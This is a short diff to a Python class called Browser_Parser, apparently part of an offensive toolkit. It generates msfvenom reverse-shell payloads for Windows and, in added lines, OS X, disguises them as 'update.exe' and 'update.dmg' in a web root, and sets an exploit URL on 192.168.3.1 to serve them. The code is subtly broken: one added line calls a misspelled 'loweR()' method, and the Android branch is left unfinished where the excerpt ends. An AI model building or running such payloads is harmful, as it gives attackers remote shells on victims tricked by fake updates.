@@ -122,9 +122,12 @@ class Browser_Parser:
 			print "creating windows payload..."
 			os.system("msfvenom -p windows/meterpreter/reverse_tcp lhost=" + self.lhost + " lport=" + self.lport + " -f exe -o /var/www/html/update.exe")
 			self.exploit = "https://192.168.3.1/update.exe"
-		else:	
-			print "please supply OS"
-			pass
+		elif operating_system.lower() == "osx":
+			print "creating OSX payload..."
+			os.system("msfvenom -p osx/x86/shell_reverse_tcp lhost=" + self.lhost + " lport=" + self.lport + " -f dmg -o /var/www/html/update.dmg")
+			self.exploit = "https://192.168.3.1/update.dmg"
+		elif operating_system.loweR() == "android":
+			print "creating android payload..."
 
 		
 
